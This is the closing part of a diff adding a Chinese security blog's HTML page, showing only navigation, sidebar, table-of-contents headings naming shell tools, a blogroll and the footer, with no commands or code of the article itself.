+  </div>
+  <br/>
+  <script> 
+      var clipboard = new Clipboard('.fa-clipboard');
+        $(".fa-clipboard").click(function(){
+        clipboard.on('success', function(){
+          swal({   
+            title: "",   
+            text: '复制成功',
+            icon: "success", 
+            showConfirmButton: true
+            });
+          });
+      });  
+  </script>
+
+      
+    </div>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" rel="tag"><i class="fas fa-tags"></i>备忘录</a>
+        
+        <a class="post-tag button" href="/tags/Shell/" rel="tag"><i class="fas fa-tags"></i>Shell</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/posts/4e91690d.html" rel="prev" title="RCE Vulnerability in antSword"><i class="fas fa-angle-left"></i><span class="nav-title">RCE Vulnerability in antSword</span></a>
+      
+    </div>
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/posts/6b5b56c.html" rel="next" title="Microsoft IIS WebDAV Write Access Code Execution"><span class="nav-title">Microsoft IIS WebDAV Write Access Code Execution</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
+  
+</div>
+
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="搜索" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <img class="author-avatar" src="/images/avatar.jpg" alt="Kuiba">
+  
+  <h1 class="author-name">Kuiba</h1>
+  <h2 class="author-description">这是一个最好的时代，也是最坏的时代，我们亲身经历着激动人心的变革，也往往会陷入选择的迷茫。</h2>
+  <div class="site-count">
+    
+    <div class="archives-count">
+      <div class="site-count-title">归档</div>
+      <div><a href="/archives/">37</a></div>
+    </div>
+    
+    
+    
+    
+    <span class="site-count-divider divider">|</span>
+    
+    <div class="tags-count">
+      <div class="site-count-title">标签</div>
+      <div><a href="/tags/">36</a></div>
+    </div>
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Awk"><span class="toc-text">Awk</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Bash"><span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Java"><span class="toc-text">Java</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Netcat"><span class="toc-text">#Netcat</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Perl"><span class="toc-text">Perl</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#PHP"><span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Powershell"><span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Ruby"><span class="toc-text">Ruby</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Socat"><span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#TCLsh"><span class="toc-text">TCLsh</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Telnet"><span class="toc-text">Telnet</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#xterm"><span class="toc-text">xterm</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#Listeners"><span class="toc-text">Listeners</span></a></li></ol></div>
+    </div>
+    
+    
+    
+    <hr>
+    <div class="social-link sidebar-item">
+      <div><i class="far fa-address-card"></i>社交链接</p></div>
+      <ul>
+        
+        <li><i class="fas fa-envelope"></i><a href="mailto:a3VpYmFoZEBmb3htYWlsLmNvbQ" target="_blank">E-Mail</a></li>
+        
+        <li><i class="fab fa-github"></i><a href="https://github.com/" target="_blank">GitHub</a></li>
+        
+        <li><i class="fab fa-weibo"></i><a href="https://weibo.com/" target="_blank">Weibo</a></li>
+        
+      </ul>
+    </div>
+    
+    
+    <hr>
+    <div class="blogroll sidebar-item">
+      <div><i class="fas fa-link"></i>大佬们的博客</div>
+      <ul>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.ggsec.cn/" target="_blank">Demon</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://payloads.online/" target="_blank">倾旋</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://wbglil.github.io/" target="_blank">WBGlIl(装小白的巨佬)</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.sariel.top/" target="_blank">只因不值得</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://uknowsec.cn/" target="_blank">Uknowse</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://422926799.github.io/" target="_blank">九世</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://yulige.top/" target="_blank">郁离歌</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://phpinfo.me/" target="_blank">Lcy</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://867810770.github.io/" target="_blank">修心</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://vinc.top/" target="_blank">Vimc</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="http://qimingyu.com/" target="_blank">qimingyu</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://x.hacking8.com/" target="_blank">小草窝</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://yiwlny.github.io/" target="_blank">Rogerd</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://loulan-ling.github.io/" target="_blank">楼兰-翎师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://manmachines.github.io/" target="_blank">菜师傅</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://whale3070.github.io/" target="_blank">whale3070</a></li>
+        
+        <li><i class="fas fa-link"></i><a href="https://www.cnblogs.com/Secde0/" target="_blank">Secde0</a></li>
+        
+      </ul>
+    </div>
+    
+  </div>
+</aside>
+
+
+          
+        </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer" style="background: #33363b;">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="回到顶部"></i></button>
+    </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Kuiba</span><span class="year"><i class="far fa-copyright"></i>2018 - 2021</span><span class="creative-commons"><i class="fab fa-creative-commons"></i><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">BY-NC-SA 4.0</a></span>
+        </div>
+        
+        <div class="busuanzi">
+          <span id="busuanzi_container_site_pv"><i class="fas fa-eye" aria-label="站点点击量" aria-hidden="false"></i><span id="busuanzi_value_site_pv"></span></span><span id="busuanzi_container_site_uv"><i class="fas fa-user" aria-label="站点用户数" aria-hidden="false"></i><span id="busuanzi_value_site_uv"></span></span><span id="busuanzi_container_page_pv"><i class="far fa-file-alt"></i><span id="busuanzi_value_page_pv" aria-label="页面点击量" aria-hidden="false"></span></span>
+        </div>
+        
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
+          本站托管于<i class="fab fa-github-alt"></i><a href="https://pages.github.com/" target="_blank">GitHub Pages</a>
+          
+        </div>
+        <div class="powered-by">
+          由 <a href="https://hexo.io/" target="_blank">Hexo</a> 强力驱动 | 主题 <a href="https://alynx.xyz/" target="_blank">AlynxZhou</a> <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  </body>
+</html>
